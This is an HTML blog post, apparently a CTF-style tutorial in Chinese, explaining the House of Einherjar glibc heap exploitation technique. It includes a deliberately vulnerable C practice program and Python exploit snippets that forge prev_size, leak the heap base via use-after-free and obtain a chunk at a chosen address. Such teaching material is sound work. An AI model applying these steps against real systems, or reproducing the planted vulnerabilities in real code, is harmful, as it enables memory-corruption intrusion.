@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk 前言题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试 &#x2F;&#x2F;gcc -o testheap -no-pie testheap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time &#x3D;0;int chunk_size[50];">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Einherjar">
+<meta property="og:url" content="http://example.com/2023/03/02/House-Of-Einherjar/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk 前言题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试 &#x2F;&#x2F;gcc -o testheap -no-pie testheap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time &#x3D;0;int chunk_size[50];">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64001ccff144a01007204056.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64001dc7f144a01007217663.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64001e92f144a010072261bf.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64002e20f144a010073cc403.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/64002f02f144a010073e320f.png">
+<meta property="article:published_time" content="2023-03-02T02:32:18.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:19:28.835Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>House Of Einherjar</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/03/safe-linking/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/01/chunk-extend-and-overlapping/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/02/House-Of-Einherjar/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/02/House-Of-Einherjar/&text=House Of Einherjar"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/02/House-Of-Einherjar/&is_video=false&description=House Of Einherjar"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House Of Einherjar&body=Check out this article: http://example.com/2023/03/02/House-Of-Einherjar/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/02/House-Of-Einherjar/&name=House Of Einherjar&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/02/House-Of-Einherjar/&t=House Of Einherjar"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-23"><span class="toc-number">2.</span> <span class="toc-text">libc2.23</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        House Of Einherjar
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-02T02:32:18.000Z" class="dt-published" itemprop="datePublished">2023-03-02</time>
+        
+        (Updated: <time datetime="2023-09-14T17:19:28.835Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/heap/">heap</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -o testheap -no-pie testheap</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> chunk_time =<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> magic_addr[<span class="number">1000</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">bss_write</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;For commissioning only&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *a[<span class="number">50</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,*a,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Convenient debugging&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter the got table of the function&quot;</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;pop %rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $8,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Keep this gift&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is fucking movie&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is always full of unhappiness, like this question&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Anyway, what&#x27;s your answer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> size[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you really want?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(chunk_time&lt;=<span class="number">32</span>&amp;&amp;chunk_time&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!chunk_ptr[chunk_time])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This is the %dth choice in your life\n&quot;</span>,chunk_time);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,size,<span class="number">0x8</span>);</span><br><span class="line">        chunk_size[chunk_time] = atoi(size);</span><br><span class="line">        chunk_ptr[chunk_time] = <span class="built_in">malloc</span>(chunk_size[chunk_time]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chunk_addr is %x\n&quot;</span>,&amp;(*chunk_ptr[chunk_time]));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,chunk_ptr[chunk_time],chunk_size[chunk_time]);</span><br><span class="line">        chunk_time++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> chunksize;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;chunksize);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come back!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],chunksize);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This program is used to debug heap vulnerabilities&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write by chen&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                gift();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                bss_write();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;You will be stronger next time I see you&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上一篇文章中 我们介绍了利用修改prev_size里实现合并的手法 基于这个漏洞 我们更进一步来利用</p>
+<p>我们知道 如果topchunk相邻低地址处的chunk处于free状态 除开fastbin和tcachebin 那么top chunk就会将其合并 此时top chunk的首地址就会成为被合并的chunk的地址</p>
+<p>这其实是house of force的内容 不过这里我们并不直接修改top chunk的prev_size </p>
+<p>而是修改与top chunk物理相邻的chunk的prev_size</p>
+<p>首先我们需要知道 当plmalloc在处理后向合并的时候 新的chunk的地址是根据当前chunk减去prev_size得到的</p>
+<p>并且后向合并的前置条件是要通过两个检查</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png"></a></p>
+<p>假设此时我们已经在某个地方伪造好了fake chunk 并且此时堆结构如图所示</p>
+<p>为了实现chunkA后向合并到fake chunk 我们需要使得chunkA_addr - prev_size &#x3D; fakechunk_addr</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk_at_offset(p, -((long) prevsize))</span><br></pre></td></tr></table></figure>
+
+<p>同时还需要使得fake_chunk的size域和chunkA的prev_size域相同</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>并且还要注意一下fake chunk的fd域和bk域 根据unlink的要求 我们需要使得fake chunk的fd域和bk域满足下面要求</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>
+
+<p>不过这个相对来说很好绕过 我们只需要让fd和bk域都为fake chunk的地址就行了 这样FD-&gt;bk 的值也还是fake chunk的地址 同理BK-&gt;fd也是</p>
+<p>同时还需要使得chunkA的inuse位为0 这样plmalloc才会认为chunkA低地址处存在一个位于bin的chunk 并且是可以合并的</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">prevsize = prev_size(p);</span><br><span class="line">size += prevsize;</span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上述要求 我们想要实现house of einherjar需要拥有以下条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.拥有堆溢出的能力 可以覆盖到next chunk的prev_size域和size域的最后一位</span><br><span class="line">2.拥有在目标地址构造fake chunk的能力</span><br><span class="line">3.拥有堆的基址来计算fake chunk和chunk的差值</span><br></pre></td></tr></table></figure>
+
+<p>下面我们开始实际利用</p>
+<h2 id="libc2-23"><a href="#libc2-23" class="headerlink" title="libc2.23"></a>libc2.23</h2><p>我们假设题目自带了打印堆基址的功能</p>
+<p>并且可以在bss段中构造fake chunk的机会  实际利用情况里需要读者自己根据实际题目判断是否可行 以及如何实现</p>
+<p>本题目由笔者本人编写 漏洞点显而易见 仅供参考</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602320</span></span><br><span class="line">chunk0_addr = add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">chunk0_addr = chunk0_addr * <span class="number">0x1000</span></span><br></pre></td></tr></table></figure>
+
+<p>首先我们创建一个0x10大小的chunk 同时接收一下当前chunk的地址 也就是堆基址 这里之所以要乘以0x1000</p>
+<p>是因为我出题的时候使用的是printf来输出 其遇到\x00就直接截断了 所以无法打印出堆基址后的三个0 这里需要自己补上</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x20</span></span><br><span class="line">prev_size = chunk1_addr-bss_addr</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(prev_size)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>随后我们再次申请一个chunk 这个chunk是用来实现本文漏洞的关键 最开始申请的chunk是用来堆溢出覆盖这个chunk的prev_size域和size域的inuse位</p>
+<p>接着我们计算出chunk1_addr 和 prev_size应该要被设置成的值</p>
+<p>接着利用chunk0的堆溢出漏洞覆盖chunk1的prev_size和inuse</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64001ccff144a01007204056.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001ccff144a01007204056.png"></a></p>
+<p>此时堆的结构如图所示</p>
+<p>接着在bss段上构造一个fake chunk 这里的函数是我为了方便演示特地写的 正常题目就别想了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x90</span>)+p64(prev_size)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">bss_write(p64(bss_addr),payload)</span><br></pre></td></tr></table></figure>
+
+<p>此时我们释放chunk1 看看其是否能过通过检查</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64001dc7f144a01007217663.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001dc7f144a01007217663.png"></a></p>
+<p>为什么是top chunk跑到了fake chunk这边呢 同时addr还和我们fake chunk不一样</p>
+<p>这是因为chunk1在和fake chunk合并之后 二者同样是一个物理相邻top chunk的堆块 所以top chunk就将其吞并</p>
+<p>而这个addr是单纯的显示问题 我们试着申请一个chunk 看看写入的content位于哪里</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x20,b&#x27;gggggggg&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64001e92f144a010072261bf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001e92f144a010072261bf.png"></a></p>
+<p>可以看到写入成功</p>
+<p>接下来 难度升级 我们来试试如果题目没有给我们赠送堆基址 我们要如何自己获取堆基址并且实现漏洞的利用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602320</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x20</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
+
+<p>首先我们申请两个任意大小的chunk  目的是为了将两个chunk放入到fastbin中 利用UAF获取其fd域内的堆地址 经过计算得到堆基址</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64002e20f144a010073cc403.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64002e20f144a010073cc403.png"></a></p>
+<p>接着我们需要把这两个chunk从fastbin中取出来 否则等下unlink的时候就会报错 原因暂时不清楚</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64002f02f144a010073e320f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64002f02f144a010073e320f.png"></a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>
+
+<p>我们重新申请两个0x10大小的chunk 此时chunk2相当于chunk0 chunk3相当于chunk1</p>
+<p>chunk4则是用来向后合并 利用漏洞的</p>
+<p>接下来的手法就和之前的一致了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prev_size = heap_addr + <span class="number">0x40</span> - bss_addr</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(prev_size)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0x100</span>)+p64(prev_size)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">bss_write(p64(bss_addr),payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc2-23"><span class="toc-number">2.</span> <span class="toc-text">libc2.23</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/02/House-Of-Einherjar/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/02/House-Of-Einherjar/&text=House Of Einherjar"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/02/House-Of-Einherjar/&is_video=false&description=House Of Einherjar"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House Of Einherjar&body=Check out this article: http://example.com/2023/03/02/House-Of-Einherjar/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
